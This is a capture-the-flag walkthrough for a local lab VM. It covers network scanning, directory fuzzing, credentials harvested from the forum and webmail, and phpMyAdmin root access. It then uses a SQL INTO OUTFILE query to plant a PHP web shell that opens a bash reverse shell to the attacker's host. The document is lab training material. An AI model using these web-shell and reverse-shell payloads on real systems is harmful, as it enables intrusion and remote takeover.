Firs find the ip of the vm:

I start by mounting a network adapter of type : `Host-only adapter`

```Shell
> ifconfig
...
vboxnet0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.1  netmask 255.255.255.0  broadcast 192.168.56.255
...
> sudo nmap -sn 192.168.56.0/24
Nmap scan report for 192.168.56.101
Host is up (0.00024s latency).
MAC Address: XX:XX:XX:XX:XX:XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

Check corresponding MAC address in Virtualbox: Settings->Network->Advanced

After we fuzz the website :

```Shell
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.56.101/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.56.101/FUZZ
Total requests: 951

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000358:   403        10 L     30 W       287 Ch      "forum"
```

OR

```Shell
gobuster dir -u http://192.168.56.101/ -w /usr/share/wordlists/dirb/big.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.101/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 291]
/.htaccess            (Status: 403) [Size: 291]
/cgi-bin/             (Status: 403) [Size: 290]
/fonts                (Status: 301) [Size: 316] [--> http://192.168.56.101/fonts/]
/forum                (Status: 403) [Size: 287]
/server-status        (Status: 403) [Size: 295]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
# OR
ffuf -w /usr/share/wordlists/wfuzz/general/big.txt -u http://192.168.56.101/FUZZ
```

We see that we have a forbidden on the page forum

But when we have check nmap we have seen than the site has also a https(443) page
When we go on it we have a different page from the http(80)
So we try to open the /forum using https://192.168.56.101/forum

Using :

username: `̀lmezard`
password: `!q\]Ej?*5K5cy*AJ`
We can register to the forum

On the user profile we can see that `̀lmezard` use the mail `laurie@borntosec.net`
We rescan the https address `ffuf -w /usr/share/wordlists/wfuzz/general/big.txt -u https://192.168.56.101/FUZZ`

```Shell
cgi-bin/                [Status: 403, Size: 291, Words: 21, Lines: 11, Duration: 1ms]
forum                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 2ms]
phpmyadmin              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 0ms]
webmail                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 4ms]
```

We that there is a `webmail` and a `phpmyadmin` page
Using the email : `laurie@borntosec.net` and the same password from the forum we will try to connect

In the last mail we can see the db credentials to use to connect to `phpmyadmin`:
user `root`
password : `Fg-'kKXBj87E:aJ$`

my local ip : 192.168.56.1

```Shell
ffuf -w /usr/share/wordlists/wfuzz/general/big.txt -u https://192.168.56.101/forum/FUZZ

...
________________________________________________

backup                  [Status: 403, Size: 295, Words: 21, Lines: 11, Duration: 11ms]
config                  [Status: 403, Size: 295, Words: 21, Lines: 11, Duration: 1ms]
images                  [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 0ms]
includes                [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 0ms]
js                      [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 1ms]
index                   [Status: 200, Size: 4935, Words: 310, Lines: 81, Duration: 102ms]
update                  [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 0ms]
:: Progress: [3024/3024] :: Job [1/1] :: 3703 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

On the github of [My-Little-Forum](https://github.com/My-Little-Forum/mylittleforum) we can see that with the images/update folder that we found there is also a folder `templates_c`

We will create a revshell so we will start be listen with nc `nc -nvlp 443`
On the sql tab we can write sql query:

```SQL
SELECT '<?php exec("/bin/bash -c ''bash -i >& /dev/tcp/192.168.56.1/443 0>&1''"); ?>'
INTO OUTFILE '/var/www/forum/templates_c/test11.php'
```

Now that we a `revshell` we can explore a little
In the folder `/home` we can see a folder `LOOKATME` in which there is a file name `password` that we can `cat`:
`lmezard:G!@M6f4Eatau{sF"`

with this we can connect to the server using ftp
